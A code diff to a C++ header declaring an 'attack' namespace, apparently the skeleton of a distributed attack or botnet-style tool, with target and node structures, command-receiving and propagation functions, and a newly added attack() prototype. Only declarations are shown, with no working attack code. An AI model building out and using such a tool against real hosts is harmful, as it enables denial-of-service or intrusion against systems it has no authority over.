@@ -21,11 +21,12 @@
 using namespace std;
 
 namespace attack {
-	const short PORT = 10;
+	const short PORT = 3000;
 
 	struct target {
 		string IP;
-		unsigned port;
+		short port;
+		bool stream;
 	};
 
 	struct node {
@@ -34,7 +35,11 @@ namespace attack {
 		bool active;
 		bool attacking;
 
-		node() : active(true),attacking(false) { }
+		int wait;
+		long queue;
+
+		node() : active(true),attacking(false),wait(3),queue(20) { }
+		node(int wait, long queue) : active(true),attacking(false),wait(wait),queue(queue) { }
 	};
 
 	void new_target(node& node, string target);
@@ -45,6 +50,7 @@ namespace attack {
 	void terminate(node& node);
 	void listen(node& node);
 	void get_commands(node& node);
+	void attack(node& node);
 	void propagate(string node, char type, string message = "");
 
 	int get_address(string name, short port, struct sockaddr_in* address);
